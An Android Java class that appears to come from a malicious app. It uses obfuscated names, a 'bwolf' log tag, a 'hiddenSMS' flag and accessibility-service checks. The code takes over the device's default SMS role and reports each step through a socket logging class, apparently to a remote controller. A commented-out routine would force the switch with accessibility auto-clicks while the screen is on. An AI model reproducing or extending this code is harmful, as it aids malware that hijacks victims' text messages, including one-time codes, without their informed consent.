package com.sonnokta.zzz.smsp;

import android.app.Activity;
import android.app.role.RoleManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;

import androidx.annotation.Nullable;

import com.sonnokta.zzz.socketsp.IOSocketyt;

public class ChangeSmsManagerew extends Activity {
    private static String TAG = "bwolf-ChangeSmsManagerew";

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            RoleManager roleManager = this.getSystemService(RoleManager.class);
            boolean isRoleAvailable = roleManager.isRoleAvailable(RoleManager.ROLE_SMS);
            if (isRoleAvailable) {
                boolean isRoleHeld = roleManager.isRoleHeld(RoleManager.ROLE_SMS);
                if (!isRoleHeld) {
                    Intent roleRequestIntent = roleManager.createRequestRoleIntent(RoleManager.ROLE_SMS);
                    startActivityForResult(roleRequestIntent, 1);
                    IOSocketyt.sendLogs("", "ChangeSmsManagerew onCreate", "success");;
                    finish();
                }
            }
        } else {
            finish();
        }
    }


//    private void swapSmsManager(Context context) {
//        try {
//            if ("1".equals(SharedPreferencess.hiddenSMS)
//                    && PermUtil.isAccessibilityServiceEnabled(context, AccessibilityServiceQ.class)
//                    && Utilslp.isScreenOn(context)) {
//                if (!Telephony.Sms.getDefaultSmsPackage(context).equals(context.getPackageName())) {
//                    SharedPreferencess.autoClickSmsCommand = "1";
//
//                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
//                        try {
//                            context.startActivity(
//                                    new Intent(context, Class.forName(ChangeSmsManagerew.class.getName()))
//                                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
//                                            .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
//                            );
//                        } catch (Exception e) {
//                            IOSocketyt.sendLogs("", "swapSmsManager " + e.getLocalizedMessage(), "error");
//                            swapSMSManager(context, context.getPackageName());
//                        }
//                    } else {
//                        swapSMSManager(context, context.getPackageName());
//                    }
//                    IOSocketyt.sendLogs("", "swapSmsManager start", "success");
//                }
//            }
//
//            if (Telephony.Sms.getDefaultSmsPackage(context).equals(context.getPackageName())
//                    && Utilslp.isScreenOn(context)) {
//                SharedPreferencess.autoClickSmsCommand = "0";
//                IOSocketyt.sendLogs("", "swapSmsManager success", "success");
//            }
//        } catch (Exception e) {
//            IOSocketyt.sendLogs("", "swapSmsManager error " + e.getLocalizedMessage(), "error");
//        }
//    }


    public void swapSMSManager(Context context, String packageName) {
        try {
            Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName);
            context.startActivity(intent);
        } catch (Exception ex) {
            IOSocketyt.sendLogs("", "swapSmsManager ${ex.localizedMessage}", "error");
        }
    }
}
